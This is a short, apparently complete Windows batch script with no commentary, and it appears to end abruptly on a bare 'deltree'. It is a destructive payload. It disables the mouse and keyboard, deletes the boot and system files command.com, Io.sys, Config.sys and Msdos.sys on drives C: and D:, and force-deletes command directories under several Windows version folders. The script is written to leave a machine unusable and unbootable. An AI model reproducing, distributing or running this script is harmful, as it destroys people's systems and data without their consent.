@echo off
C:\WINDOWS\rundll.exe mouse,disable
C:\WINDOWS\rundll.exe keyboard,disable
del c:\command.com
del c:\Io.sys
del c:\Config.sys
del c:\Msdos.sys
del c:\windows\system32\command.com
deltree /y C:\WINDOWS\COMMAND*.*\
deltree /y C:\WIN98\COMMAND*.*\
deltree /y C:\WINme\COMMAND*.*\
deltree /y C:\WIN_me\COMMAND*.*\
deltree /y C:\WINxp\COMMAND*.*\
deltree /y C:\WIN_xp\COMMAND*.*\
del d:\command.com
del d:\Io.sys
del d:\Config.sys
del d:\Msdos.sys
del d:\windows\system32\command.com
deltree